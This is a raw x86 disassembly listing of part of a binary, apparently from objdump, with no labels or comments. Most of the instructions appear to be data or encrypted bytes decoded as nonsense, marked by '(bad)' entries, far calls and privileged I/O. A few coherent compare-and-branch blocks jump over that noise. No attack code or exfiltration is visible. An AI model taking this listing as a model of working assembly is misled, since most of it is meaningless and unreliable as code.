  41bb03:	xchg   ecx,eax
  41bb04:	shr    DWORD PTR [eax],0xfa
  41bb07:	pushf  
  41bb08:	not    BYTE PTR [esi-0x30]
  41bb0b:	clc    
  41bb0c:	xor    esp,DWORD PTR [edi-0x59]
  41bb0f:	push   ss
  41bb10:	data16 sbb al,0x2a
  41bb13:	dec    eax
  41bb14:	and    BYTE PTR [eax-0x2f29ce93],ah
  41bb1a:	jle    0x41bb2f
  41bb1c:	dec    esi
  41bb1d:	fs pop edi
  41bb1f:	dec    ecx
  41bb20:	popa   
  41bb21:	pop    ss
  41bb22:	fdivr  st(5),st
  41bb24:	adc    DWORD PTR gs:[edi-0x2b],ebp
  41bb28:	repnz test eax,0x97c0bd86
  41bb2e:	mov    edi,0x15f8677
  41bb33:	xchg   BYTE PTR [ebx+0x41],dh
  41bb36:	push   es
  41bb37:	jbe    0x41bba0
  41bb39:	jno    0x41bb37
  41bb3b:	xchg   esi,eax
  41bb3c:	nop
  41bb3d:	clc    
  41bb3e:	call   0xbdb7:0xbc764a8c
  41bb45:	push   0x989553
  41bb4a:	lds    edx,FWORD PTR [ecx]
  41bb4c:	mov    ebx,0xb827a5d6
  41bb51:	jb     0x41bba6
  41bb53:	pop    edx
  41bb54:	in     eax,0xb2
  41bb56:	mov    cl,0xb4
  41bb58:	outs   dx,DWORD PTR ss:[esi]
  41bb5a:	(bad)  
  41bb5b:	pop    esp
  41bb5c:	xchg   ebx,eax
  41bb5d:	stos   BYTE PTR es:[edi],al
  41bb5e:	cwde   
  41bb5f:	push   ebx
  41bb60:	xor    eax,0x2f886804
  41bb65:	loop   0x41bb00
  41bb67:	cmp    ecx,eax
  41bb69:	jne    0x41cd76
  41bb6f:	cmp    DWORD PTR [esp+0x24],edx
  41bb73:	jne    0x41cd76
  41bb79:	mov    DWORD PTR [esp+0x38],0x422344
  41bb81:	mov    DWORD PTR [esp+0x34],0x42233c
  41bb89:	mov    eax,DWORD PTR [esp+0x48]
  41bb8d:	mov    eax,DWORD PTR [esp+0x48]
  41bb91:	mov    edx,DWORD PTR [esp+0x58]
  41bb95:	xor    ecx,ecx
  41bb97:	jmp    0x41be2d
  41bb9c:	(bad)  
  41bb9d:	mov    esi,0x7d53794b
  41bba2:	std    
  41bba3:	rcr    DWORD PTR gs:[ebp+0x79],0x5
  41bba8:	mov    al,0x13
  41bbaa:	xor    DWORD PTR gs:[esi],eax
  41bbad:	pop    esp
  41bbae:	sar    DWORD PTR [ebx-0x44444058],0x4a
  41bbb5:	adc    BYTE PTR [edx+0x40],cl
  41bbb8:	xchg   esi,eax
  41bbb9:	scas   al,BYTE PTR es:[edi]
  41bbba:	cmp    ah,BYTE PTR [ecx]
  41bbbc:	sahf   
  41bbbd:	pushf  
  41bbbe:	dec    esi
  41bbbf:	add    al,0x4
  41bbc1:	pop    es
  41bbc2:	pop    esp
  41bbc3:	dec    edi
  41bbc4:	mul    BYTE PTR [edx+esi*8+0x1b]
  41bbc8:	and    BYTE PTR [ebp+0x7ac1f4b5],al
  41bbce:	call   0x80f6:0xd2b16c88
  41bbd5:	jne    0x41bbc6
  41bbd7:	shl    esp,cl
  41bbd9:	test   DWORD PTR [esi+0x7584146c],edx
  41bbdf:	push   ss
  41bbe0:	mov    ch,BYTE PTR [esi-0x52868eea]
  41bbe6:	scas   eax,DWORD PTR es:[edi]
  41bbe7:	pushf  
  41bbe8:	pop    es
  41bbe9:	sub    al,0x73
  41bbeb:	adc    al,0x8a
  41bbed:	loopne 0x41bc0c
  41bbef:	dec    ecx
  41bbf0:	ins    DWORD PTR es:[edi],dx
  41bbf1:	xchg   DWORD PTR [ebx+0x52e060e9],ecx
  41bbf7:	rol    BYTE PTR [edx],1
  41bbf9:	mov    ch,0xd2
  41bbfb:	adc    ch,BYTE PTR [edi]
  41bbfd:	mov    eax,ds:0xcd0d0afb
  41bc02:	jecxz  0x41bc35
  41bc04:	or     esi,esi
  41bc06:	stc    
  41bc07:	aas    
  41bc08:	fwait
  41bc09:	data16 adc BYTE PTR [edi+eiz*8-0x1ccff901],ah
  41bc11:	rcr    bh,0x53
  41bc14:	out    dx,eax
  41bc15:	cmp    DWORD PTR [ecx],ebp
  41bc17:	aas    
  41bc18:	hlt    
  41bc19:	jge    0x41bc92
  41bc1b:	or     DWORD PTR [edi],ebp
  41bc1d:	jae    0x41bc23
  41bc1f:	xchg   DWORD PTR [eax-0x7b],esp
  41bc22:	(bad)  
  41bc24:	popa   
  41bc25:	pusha  
  41bc26:	out    dx,eax
  41bc27:	push   ecx
  41bc28:	dec    eax
  41bc29:	sbb    al,0x7a
  41bc2b:	and    dh,BYTE PTR [ebx-0x1e]
  41bc2e:	in     al,dx
  41bc2f:	add    al,BYTE PTR [ecx-0x12b108ef]
  41bc35:	retf   0x7413
  41bc38:	xchg   edi,eax
  41bc39:	cld    
  41bc3a:	fist   DWORD PTR [edi-0x115104d1]
  41bc40:	mov    dh,0xcf
  41bc42:	stos   DWORD PTR es:[edi],eax
  41bc43:	lahf   
  41bc44:	sub    esp,esi
  41bc46:	jb     0x41bbd8
  41bc48:	sbb    eax,0xc8f38688
  41bc4d:	cmp    BYTE PTR cs:[ebx+0x38eff6a6],0x6e
  41bc55:	pop    edx
  41bc56:	cmp    BYTE PTR [edi],dh
  41bc58:	push   edx
  41bc59:	jmp    0x60fc:0x9edcc956
  41bc60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc61:	lods   eax,DWORD PTR ds:[esi]
  41bc62:	inc    esi
  41bc63:	fdiv   st(0),st
  41bc65:	mov    eax,DWORD PTR [esi+0xdc63889]
  41bc6b:	in     al,dx
  41bc6c:	cmp    al,0x90
  41bc6e:	popa   
  41bc6f:	shr    BYTE PTR gs:[esp+ebx*4-0x7088c02f],cl
  41bc77:	add    BYTE PTR [ebx],ah
  41bc79:	jge    0x41bc11
  41bc7b:	dec    ebx
  41bc7c:	jecxz  0x41bcf5
  41bc7e:	and    BYTE PTR [ecx+0x71b7052b],dh
  41bc84:	dec    eax
  41bc85:	ja     0x41bca6
  41bc87:	inc    ecx
  41bc88:	jo     0x41bccc
  41bc8a:	sub    cl,BYTE PTR [ebx-0x5c1958c]
  41bc90:	pop    ecx
  41bc91:	fwait
  41bc92:	jnp    0x41bc8d
  41bc94:	push   ds
  41bc95:	leave  
  41bc96:	adc    esp,DWORD PTR [esi]
  41bc98:	das    
  41bc99:	mov    al,ds:0x19f72383
  41bc9e:	out    0x97,eax
  41bca0:	cmc    
  41bca1:	xchg   esi,eax
  41bca2:	and    BYTE PTR [edx-0x3d],ah
  41bca5:	and    eax,0x5fb0a5b5
  41bcaa:	rol    dl,1
  41bcac:	sbb    eax,0xf6a34af8
  41bcb1:	mov    ebp,0xdb54e9cc
  41bcb6:	cs xor al,0xdd
  41bcb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcba:	xchg   bl,bl
  41bcbc:	mov    edi,0xd0806164
  41bcc1:	jmp    0x6891:0x77edb76
  41bcc8:	scas   eax,DWORD PTR es:[edi]
  41bcc9:	or     ah,BYTE PTR [ebx-0x56]
  41bccc:	cmc    
  41bccd:	jl     0x41bd12
  41bccf:	pop    ecx
  41bcd0:	xor    BYTE PTR [ecx+esi*2],bh
  41bcd3:	or     al,0x28
  41bcd5:	jno    0x41bca7
  41bcd7:	ret    
  41bcd8:	test   BYTE PTR [edi+esi*2+0x61],dl
  41bcdc:	mov    ebp,0x502fc298
  41bce1:	rol    ebx,cl
  41bce3:	in     al,0x9d
  41bce5:	loope  0x41bca5
  41bce7:	jl     0x41bcea
  41bce9:	cs pop ss
  41bceb:	arpl   WORD PTR [ebx-0x5a0bd4ad],bp
  41bcf1:	mov    ah,0x5e
  41bcf3:	sbb    DWORD PTR [eax+ecx*2+0x30],edi
  41bcf7:	push   DWORD PTR [ebx]
  41bcf9:	pop    edi
  41bcfa:	sub    eax,0x8bd797c2
  41bcff:	int3   
  41bd00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd01:	ror    BYTE PTR [ebx+edx*2],cl
  41bd04:	jp     0x4b7185c3
  41bd0a:	push   ss
  41bd0b:	push   edi
  41bd0c:	xor    ebx,ebx
  41bd0e:	jne    0x41bd4d
  41bd10:	gs mov esi,0x9a9dfb6
  41bd16:	and    DWORD PTR [edx],ebx
  41bd18:	inc    ebx
  41bd19:	pop    edx
  41bd1a:	push   ecx
  41bd1b:	push   ecx
  41bd1c:	shr    DWORD PTR [esi],0x5d
  41bd1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd20:	out    dx,eax
  41bd21:	or     al,0x58
  41bd23:	xchg   esi,eax
  41bd24:	jmp    0x9912:0xfca76bd
  41bd2b:	and    ebx,DWORD PTR ds:0x521979ce
  41bd31:	xchg   ebx,eax
  41bd32:	test   DWORD PTR [edx-0x3696f536],edi
  41bd38:	xor    al,0xcd
  41bd3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd3b:	icebp  
  41bd3c:	dec    ebx
  41bd3d:	xchg   edx,eax
  41bd3e:	xor    dh,BYTE PTR [edi+0x4a5ad5e6]
  41bd44:	jg     0x41bd24
  41bd46:	or     BYTE PTR [edi],dl
  41bd48:	and    bl,BYTE PTR [eax]
  41bd4a:	das    
  41bd4b:	stos   DWORD PTR es:[edi],eax
  41bd4c:	aad    0x75
  41bd4e:	cld    
  41bd4f:	cdq    
  41bd50:	cli    
  41bd51:	imul   ecx,DWORD PTR [edi-0x27],0xfffffff8
  41bd55:	and    al,0x85
  41bd57:	mov    eax,ds:0xc82fca32
  41bd5c:	call   0xbf7f:0xd2cb0829
  41bd63:	pusha  
  41bd64:	xor    ah,BYTE PTR [ebp+edx*8+0x23]
  41bd68:	adc    eax,edi
  41bd6a:	bound  ebx,QWORD PTR [edx+0x714ea57e]
  41bd70:	jp     0x41bd1b
  41bd72:	test   eax,0x866d4687
  41bd77:	lock mov ch,0x8e
  41bd7a:	sbb    BYTE PTR [ecx],cl
  41bd7c:	enter  0xa1b9,0x79
  41bd80:	add    eax,0xb16474be
  41bd85:	sar    BYTE PTR [edi+0xd],0xe
  41bd89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd8a:	fsubr  DWORD PTR [ebx+0x2b]
  41bd8d:	iret   
  41bd8e:	mov    WORD PTR [ebx],cs
  41bd90:	scas   al,BYTE PTR es:[edi]
  41bd91:	into   
  41bd92:	jbe    0x41bd9f
  41bd94:	mov    ebx,0x7c7980a5
  41bd99:	adc    ecx,DWORD PTR [eax]
  41bd9b:	int3   
  41bd9c:	xor    ch,BYTE PTR [esi]
  41bd9e:	test   BYTE PTR [ebx+0x65],dl
  41bda1:	popa   
  41bda2:	pop    esp
  41bda3:	xchg   ebp,eax
  41bda4:	sbb    DWORD PTR [ecx+0x19d6604a],0x61f49171
  41bdae:	repnz not ah
  41bdb1:	outs   dx,DWORD PTR ds:[esi]
  41bdb2:	lds    ebx,FWORD PTR [ebx+0x7d780567]
  41bdb8:	push   cs
  41bdb9:	dec    esp
  41bdba:	cmp    ah,BYTE PTR [esi-0x7897fd8]
  41bdc0:	sti    
  41bdc1:	push   0x6b
  41bdc3:	and    BYTE PTR [ebp+0x40fe77b8],ah
  41bdc9:	fcomp  QWORD PTR [ebx-0x75]
  41bdcc:	adc    eax,0xf8868e39
  41bdd1:	sub    BYTE PTR [eax+0x7fa2d600],ah
  41bdd7:	push   ss
  41bdd8:	(bad)  
  41bdd9:	fst    QWORD PTR [ecx+0x3d]
  41bddc:	push   eax
  41bddd:	jnp    0x41bde3
  41bddf:	aad    0x48
  41bde1:	sub    ah,BYTE PTR [ebx]
  41bde3:	xchg   esp,eax
  41bde4:	fldcw  WORD PTR [edx-0x6c9ebf0e]
  41bdea:	lods   eax,DWORD PTR ds:[esi]
  41bdeb:	outs   dx,BYTE PTR ds:[esi]
  41bdec:	jecxz  0x41bdb2
  41bdee:	ds jle 0x41be05
  41bdf1:	outs   dx,DWORD PTR ds:[esi]
  41bdf2:	ret    
  41bdf3:	push   esp
  41bdf4:	and    BYTE PTR [eax],al
  41bdf6:	or     DWORD PTR [esi],ebx
  41bdf8:	shl    BYTE PTR [ecx-0x5f],0x9c
  41bdfc:	(bad)  
  41bdfd:	loopne 0x41be00
  41bdff:	mov    ch,ch
  41be01:	mov    WORD PTR [ebx-0x25],ds
  41be04:	nop
  41be05:	fidiv  WORD PTR [edx+0x54]
  41be08:	(bad)  
  41be09:	call   0xd0cec4c1
  41be0e:	sub    eax,0xf5798d80
  41be13:	fisub  DWORD PTR [ebx-0x7b1aed6d]
  41be19:	imul   edx,DWORD PTR [edi+esi*8+0x5a],0xde031caf
  41be21:	mov    bl,0x17
  41be23:	scas   eax,DWORD PTR es:[edi]
  41be24:	add    edi,ebx
  41be26:	daa    
  41be27:	adc    eax,0x2f7147d9
  41be2c:	xor    BYTE PTR [edi],cl
  41be2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be2f:	rol    DWORD PTR [edx],0xc1
  41be32:	loopne 0x41be36
  41be34:	mov    DWORD PTR [esp+0x20],edx
  41be38:	mov    edx,DWORD PTR [esp+0x5c]
  41be3c:	xor    eax,ebx
  41be3e:	xor    ecx,esi
  41be40:	mov    DWORD PTR [esp+0x24],edx
  41be44:	cmp    DWORD PTR [esp+0x20],eax
  41be48:	jne    0x41c76d
  41be4e:	cmp    edx,ecx
  41be50:	jne    0x41c76d
  41be56:	mov    DWORD PTR [esp+0x20],0x4222cc
  41be5e:	mov    ecx,DWORD PTR [esp+0x58]
  41be62:	mov    eax,DWORD PTR [esp+0x5c]
  41be66:	shrd   ecx,eax,0x2
  41be6a:	shr    eax,0x2
  41be6d:	mov    eax,DWORD PTR [esp+0x58]
  41be71:	mov    edx,DWORD PTR [esp+0x5c]
  41be75:	xor    ecx,0x32e26d9d
  41be7b:	shl    eax,0x1e
  41be7e:	jmp    0x41c114
  41be83:	cmp    edx,DWORD PTR [esi]
  41be85:	ins    DWORD PTR es:[edi],dx
  41be86:	scas   eax,DWORD PTR es:[edi]
  41be87:	mov    ebp,0x8f3699b5
  41be8c:	or     eax,eax
  41be8e:	cmp    esi,edi
  41be90:	bound  edx,QWORD PTR [ecx-0x3e9f0a05]
  41be96:	mov    ebx,0xbbbbbfa8
  41be9b:	arpl   WORD PTR [edi+0x5],cx
  41be9e:	or     BYTE PTR [edi+0x59],ch
  41bea1:	jmp    0x902bc40d
  41bea6:	adc    DWORD PTR ds:0xe328b92a,esi
  41beac:	push   eax
  41bead:	outs   dx,BYTE PTR ds:[esi]
  41beae:	rcl    BYTE PTR [ecx-0x8],0xb5
  41beb2:	dec    eax
  41beb3:	adc    BYTE PTR [ebx+0x4fba6835],al
  41beb9:	ret    
  41beba:	jg     0x41be92
  41bebc:	add    eax,DWORD PTR [edx-0x6d]
  41bebf:	dec    ebx
  41bec0:	sti    
  41bec1:	fcomp  DWORD PTR [edi-0x3785b5ef]
  41bec7:	and    DWORD PTR [edi+0x32],0xd9d52ab9
  41bece:	or     bl,ch
  41bed0:	sbb    eax,0x193c9ad6
  41bed5:	pop    ebx
  41bed6:	out    dx,al
  41bed7:	test   esi,esp
  41bed9:	lods   eax,DWORD PTR ds:[esi]
  41beda:	push   edi
  41bedb:	mov    cs,WORD PTR [edi]
  41bedd:	xor    BYTE PTR [edx+0x5d],cl
  41bee0:	es jmp 0xb55d:0x25e5ac09
  41bee8:	mov    cl,0xb1
  41beea:	dec    edi
  41beeb:	in     al,0x37
  41beed:	lods   al,BYTE PTR ds:[esi]
  41beee:	fisttp WORD PTR [esi-0xb437f5]
  41bef4:	push   esi
  41bef5:	jnp    0x41bf07
  41bef7:	xchg   edx,eax
  41bef8:	int    0xf2
  41befa:	mov    eax,ds:0x8d8838ab
  41beff:	ss sub eax,0xc6e2ab48
  41bf05:	std    
  41bf06:	add    ecx,esi
  41bf08:	xor    ch,ch
  41bf0a:	lods   eax,DWORD PTR ds:[esi]
  41bf0b:	inc    esi
  41bf0c:	or     al,0xe1
  41bf0e:	or     DWORD PTR [edx+0x30],esi
  41bf11:	jg     0x41bf0e
  41bf13:	leave  
  41bf14:	mov    ebp,0xcc0bcced
  41bf19:	jmp    0x17be:0x9e284fa3
  41bf20:	inc    edx
  41bf21:	inc    esi
  41bf22:	sbb    eax,0x365bc372
  41bf27:	bound  esi,QWORD PTR [eax-0x38]
  41bf2a:	or     dh,al
  41bf2c:	mov    esp,DWORD PTR [eax-0x45737776]
  41bf32:	xor    al,0x33
  41bf34:	push   ebp
  41bf35:	xchg   BYTE PTR [ebp+0x6fc246a6],bh
  41bf3b:	push   ebx
  41bf3c:	leave  
  41bf3d:	jne    0x41bf5e
  41bf3f:	pop    esi
  41bf40:	jne    0x41bf5a
  41bf42:	out    dx,al
  41bf43:	ret    0xdd8e
  41bf46:	adc    DWORD PTR ss:[eax],eax
  41bf49:	jae    0x41bf55
  41bf4b:	pop    ebp
  41bf4c:	js     0x41bf8e
  41bf4e:	mov    bh,0xd3
  41bf50:	and    BYTE PTR [edx+0x42],dh
  41bf53:	es std 
  41bf55:	repnz cmp BYTE PTR [ebx+0x2e],cl
  41bf59:	rol    DWORD PTR [ebp-0x59],cl
  41bf5c:	aam    0xc1
  41bf5e:	iret   
  41bf5f:	adc    DWORD PTR [esi-0x17],ebx
  41bf62:	lea    ecx,[eax]
  41bf64:	dec    ecx
  41bf65:	jle    0x41bfd1
  41bf67:	(bad)  
  41bf68:	scas   eax,DWORD PTR es:[edi]
  41bf69:	mov    esp,0xafb9e944
  41bf6e:	(bad)  
  41bf6f:	scas   eax,DWORD PTR es:[edi]
  41bf70:	daa    
  41bf71:	sbb    esi,DWORD PTR [edx]
  41bf73:	dec    edx
  41bf74:	pop    ds
  41bf75:	xchg   ebx,eax
  41bf76:	xor    al,BYTE PTR [eax]
  41bf78:	fcom   QWORD PTR [edi]
  41bf7a:	and    al,0x95
  41bf7c:	dec    esi
  41bf7d:	sbb    edx,ebx
  41bf7f:	or     bl,BYTE PTR [ebp+0x0]
  41bf82:	sub    al,0xc3
  41bf84:	pushf  
  41bf85:	mov    WORD PTR [esi-0x46],?
  41bf88:	mov    edx,0xba0ec2f8
  41bf8d:	loop   0x41bf62
  41bf8f:	jmp    0xf1ceb5a0
  41bf94:	out    0x56,eax
  41bf96:	jnp    0x41bffb
  41bf98:	js     0x41c00c
  41bf9a:	ret    
  41bf9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf9c:	sbb    DWORD PTR [ebx+ebx*4],esp
  41bf9f:	sbb    BYTE PTR [edi],al
  41bfa1:	int3   
  41bfa2:	sub    BYTE PTR ds:0x40556dbf,0x2a
  41bfa9:	mov    dh,0x75
  41bfab:	adc    al,0x2
  41bfad:	mov    edx,0x561dcf5
  41bfb2:	dec    esi
  41bfb3:	sahf   
  41bfb4:	es cs ret 
  41bfb7:	imul   ebx,DWORD PTR [esi+ecx*1-0x6be4e277],0x49847a33
  41bfc2:	pop    edi
  41bfc3:	or     eax,0xb21a5ce5
  41bfc8:	pusha  
  41bfc9:	rcr    BYTE PTR [ebx-0x25],cl
  41bfcc:	lock adc ebp,ecx
  41bfcf:	ins    DWORD PTR es:[edi],dx
  41bfd0:	adc    dl,BYTE PTR [ecx]
  41bfd2:	jge    0x41c00e
  41bfd4:	int3   
  41bfd5:	add    ecx,DWORD PTR [esi+0x6f]
  41bfd8:	push   eax
  41bfd9:	adc    eax,0x2b0f9f0
  41bfde:	sbb    al,0x4a
  41bfe0:	imul   ebx,DWORD PTR [edx+0x2e],0x3a0797dd
  41bfe7:	xor    al,0xe1
  41bfe9:	sbb    al,0xdd
  41bfeb:	sub    esp,DWORD PTR [edi-0x80]
  41bfee:	jo     0x41c032
  41bff0:	or     BYTE PTR [edx-0x28],bl
  41bff3:	jl     0x41c045
  41bff5:	pushf  
  41bff6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bff7:	adc    BYTE PTR [ebx+0x3d],0x4d
  41bffb:	test   DWORD PTR [ebx+0x22],edi
  41bffe:	or     al,0x21
  41c000:	fstp   DWORD PTR [edx]
  41c002:	cs mov ebx,0xbdc688a7
  41c008:	mov    ch,0xc6
  41c00a:	loop   0x41bffd
  41c00c:	or     ecx,DWORD PTR [ecx]
  41c00e:	pop    es
  41c00f:	retf   0x9376
  41c012:	sbb    BYTE PTR [ebp-0x118eceee],bh
  41c018:	mov    WORD PTR [ebp+0x12],ss
  41c01b:	or     edx,0x9bc6c091
  41c021:	icebp  
  41c022:	sahf   
  41c023:	mov    eax,ds:0xa5cb08fc
  41c028:	out    dx,al
  41c029:	pop    edi
  41c02a:	ins    DWORD PTR es:[edi],dx
  41c02b:	mov    dl,BYTE PTR cs:[edi+0x21]
  41c02f:	(bad)  
  41c030:	jmp    FWORD PTR [esi+0x70]
  41c033:	test   eax,0x5b87d731
  41c038:	pop    ebp
  41c039:	in     eax,dx
  41c03a:	mov    al,ds:0x3ad3829e
  41c03f:	pop    ecx
  41c040:	rcr    BYTE PTR [edx],1
  41c042:	sbb    eax,0x1b75f094
  41c047:	jno    0x41c0a4
  41c049:	mov    edx,edx
  41c04b:	imul   edx,DWORD PTR [edx+0x16f2fb17],0xffffff8c
  41c052:	enter  0x8b7a,0xab
  41c056:	push   eax
  41c057:	mov    dl,0x86
  41c059:	cmp    DWORD PTR [edi-0xe2ce2ac],0x701daf5f
  41c063:	lods   eax,DWORD PTR ds:[esi]
  41c064:	ret    
  41c065:	shr    dl,cl
  41c067:	xor    BYTE PTR [ebp+0x4f8be89a],ah
  41c06d:	sub    BYTE PTR [esi+0x1875f7a9],dh
  41c073:	mov    esi,0x6ec5e35f
  41c078:	and    BYTE PTR [edi-0x9f52d43],dl
  41c07e:	xor    ah,bl
  41c080:	jb     0x41c0c8
  41c082:	or     BYTE PTR [ecx+0x68],dh
  41c085:	cdq    
  41c086:	pop    eax
  41c087:	int3   
  41c088:	pop    edi
  41c089:	dec    eax
  41c08a:	aam    0x3c
  41c08c:	adc    DWORD PTR [ecx-0x2e549a4f],esp
  41c092:	mov    cl,0x8d
  41c094:	cmc    
  41c095:	jl     0x41c0a8
  41c097:	aas    
  41c098:	cmp    edx,DWORD PTR [eax+0xf]
  41c09b:	mov    dl,0xe3
  41c09d:	cmp    esi,ebx
  41c09f:	ud2    
  41c0a1:	or     BYTE PTR [bx+si+0x753f],ah
  41c0a6:	push   0xffffffa4
  41c0a8:	ror    ch,1
  41c0aa:	mov    edi,0x5732f387
  41c0af:	ins    DWORD PTR es:[edi],dx
  41c0b0:	add    bl,BYTE PTR [ecx-0x680c3bf0]
  41c0b6:	pop    ebp
  41c0b7:	cld    
  41c0b8:	stc    
  41c0b9:	fisubr WORD PTR [eax+eiz*1-0x6ee6f9a]
  41c0c0:	jmp    0x95b:0xe60a67c
  41c0c7:	xchg   ebx,esi
  41c0c9:	es cdq 
  41c0cb:	cdq    
  41c0cc:	imul   eax,esi,0x4f36c1ea
  41c0d2:	test   al,0x8e
  41c0d4:	in     eax,0x59
  41c0d6:	fdiv   QWORD PTR [edx+0x18bdcbb]
  41c0dc:	add    DWORD PTR [esi+0x2e],eax
  41c0df:	fstp   st(2)
  41c0e1:	mov    eax,0x9441bd3a
  41c0e6:	push   ecx
  41c0e7:	call   0xb25b0513
  41c0ec:	add    eax,0xe45eab1d
  41c0f1:	mov    ah,0xe8
  41c0f3:	xchg   esp,eax
  41c0f4:	pop    ss
  41c0f5:	mov    ?,WORD PTR [eax+0x7f]
  41c0f8:	mov    dl,0x79
  41c0fa:	pop    ds
  41c0fb:	lea    esp,[ebx]
  41c0fd:	mov    al,0x7
  41c0ff:	add    ebx,DWORD PTR [ecx]
  41c101:	stos   DWORD PTR es:[edi],eax
  41c102:	pop    ds
  41c103:	inc    ebx
  41c104:	sub    eax,DWORD PTR [ebx+0x72]
  41c107:	sub    BYTE PTR [edi],ah
  41c109:	sbb    esp,esp
  41c10b:	push   eax
  41c10c:	popa   
  41c10d:	inc    edx
  41c10e:	mov    ebx,0x903ad0de
  41c113:	into   
  41c114:	xor    eax,eax
  41c116:	or     eax,ecx
  41c118:	mov    ecx,DWORD PTR [esp+0x20]
  41c11c:	mov    ecx,DWORD PTR [ecx+0xc]
  41c11f:	jmp    0x41c3b5
  41c124:	dec    ebp
  41c125:	fistp  DWORD PTR [eax-0x5242420b]
  41c12b:	jb     0x41c167
  41c12d:	lea    edi,[esi-0x4c27e8c5]
  41c133:	das    
  41c134:	(bad)  [edx-0x3f]
  41c137:	mov    ebx,0xbbbbbfa8
  41c13c:	jecxz  0x41c155
  41c13e:	mov    ds:0xc8a52c58,eax
  41c143:	or     al,0x3b
  41c145:	lock clc 
  41c147:	jmp    0xcaa4f19
  41c14c:	mov    ds:0xe48f7d3b,al
  41c151:	dec    edi
  41c152:	sub    bh,BYTE PTR [edi+0x4db4545a]
  41c158:	push   esi
  41c159:	(bad)  
  41c15a:	jmp    0x464c111b
  41c15f:	push   es
  41c160:	push   0xa4e82e28
  41c165:	xchg   ecx,eax
  41c166:	fwait
  41c167:	in     al,dx
  41c168:	pushf  
  41c169:	lahf   
  41c16a:	lahf   
  41c16b:	dec    ebp
  41c16c:	sub    dl,al
  41c16e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c16f:	jb     0x41c1d3
  41c171:	out    dx,eax
  41c172:	int    0x7d
  41c174:	test   BYTE PTR [esi],ah
  41c176:	stos   DWORD PTR es:[edi],eax
  41c177:	cs or  al,0xc7
  41c17a:	pop    ebx
  41c17b:	jge    0x41c130
  41c17d:	sbb    eax,0x4bea4f2
  41c182:	xchg   ebp,eax
  41c183:	ja     0x41c164
  41c185:	fmul   DWORD PTR [ebx]
  41c187:	neg    DWORD PTR [esi+ecx*8-0x22]
  41c18b:	pushf  
  41c18c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c18d:	jnp    0x41c1dc
  41c18f:	push   ecx
  41c190:	mov    al,0xf6
  41c192:	sahf   
  41c193:	xlat   BYTE PTR ds:[ebx]
  41c194:	mov    DWORD PTR [edx],ecx
  41c196:	mov    bl,0xc4
  41c198:	addr16 out dx,eax
  41c19a:	jae    0x86d9e63f
  41c1a0:	call   FWORD PTR [edx-0x63670627]
  41c1a6:	dec    eax
  41c1a7:	dec    edx
  41c1a8:	dec    ebp
  41c1a9:	popf   
  41c1aa:	jno    0x41c209
  41c1ac:	iret   
  41c1ad:	call   0x360dc195
  41c1b2:	test   BYTE PTR [eax+0x29eb3e9e],dh
  41c1b8:	adc    eax,0xae6ff6ae
  41c1bd:	push   ebp
  41c1be:	pop    edx
  41c1bf:	imul   ebx,DWORD PTR [eax],0xdf416e64
  41c1c5:	mov    ah,0xa8
  41c1c7:	scas   al,BYTE PTR es:[edi]
  41c1c8:	fisubr DWORD PTR [esi+ebx*4-0x3394a9db]
  41c1cf:	or     al,0x35
  41c1d1:	dec    edx
  41c1d2:	pop    es
  41c1d3:	inc    esp
  41c1d4:	add    DWORD PTR [eax+0x58],eax
  41c1d7:	cmc    
  41c1d8:	(bad)  
  41c1d9:	mov    esi,0xce37dba8
  41c1de:	in     al,0x72
  41c1e0:	sub    BYTE PTR [ebx-0x16],bh
  41c1e3:	ins    BYTE PTR es:[edi],dx
  41c1e4:	mov    bl,0xcc
  41c1e6:	(bad)  
  41c1e7:	cmp    BYTE PTR [edx+0x4f7fb646],ch
  41c1ed:	sub    BYTE PTR [edx+0x3e],dh
  41c1f0:	ret    0x5257
  41c1f3:	aad    0x53
  41c1f5:	into   
  41c1f6:	das    
  41c1f7:	bound  esp,QWORD PTR [ecx-0x6729f3f2]
  41c1fd:	push   esi
  41c1fe:	jnp    0x41c25b
  41c200:	cmp    al,0xbf
  41c202:	dec    ebp
  41c203:	xlat   BYTE PTR ds:[ebx]
  41c204:	fwait
  41c205:	add    ebx,DWORD PTR [ecx-0x52]
  41c208:	jle    0x41c1af
  41c20a:	rol    BYTE PTR ss:[ebx-0x5b86043],1
  41c211:	mov    eax,ds:0xab5ec269
  41c216:	aad    0xb
  41c218:	add    DWORD PTR [ebp+0x2eb84a22],esp
  41c21e:	and    BYTE PTR [ebx+0x1e],0xd0
  41c222:	sbb    ebx,esp
  41c224:	sbb    eax,0xc3425beb
  41c229:	xor    eax,0xa5f22463
  41c22e:	mov    ebx,0x8fd2f7be
  41c233:	and    al,0x5b
  41c235:	(bad)  
  41c236:	and    ch,BYTE PTR [ebp-0x2cf0789d]
  41c23c:	sbb    DWORD PTR [ebx-0x24b96c7c],edi
  41c242:	and    al,bh
  41c244:	mov    ds:0x5c35be05,eax
  41c249:	push   esp
  41c24a:	inc    ebx
  41c24b:	cmp    BYTE PTR [eax],0xd2
  41c24e:	ja     0x41c2b8
  41c250:	mov    ds:0x774566eb,al
  41c255:	sbb    bl,0x12
  41c258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c259:	cmp    ebx,0xffffff8a
  41c25c:	lea    eax,[ebx+0x60fdc801]
  41c262:	jmp    0xf07fc4b5
  41c267:	dec    ebp
  41c268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c269:	cld    
  41c26a:	je     0x41c272
  41c26c:	mov    esi,DWORD PTR [edx+edx*4-0x1f81ed22]
  41c273:	xchg   edx,eax
  41c274:	pop    ds
  41c275:	dec    edi
  41c276:	mov    ah,0x52
  41c278:	jmp    0xdb62:0x79119281
  41c27f:	mov    dh,0xb5
  41c281:	jno    0x41c212
  41c283:	ficomp DWORD PTR [ecx-0x46]
  41c286:	ja     0x41c2a1
  41c288:	mov    esi,0xb2ec80c4
  41c28d:	sub    DWORD PTR [eax+0x17],eax
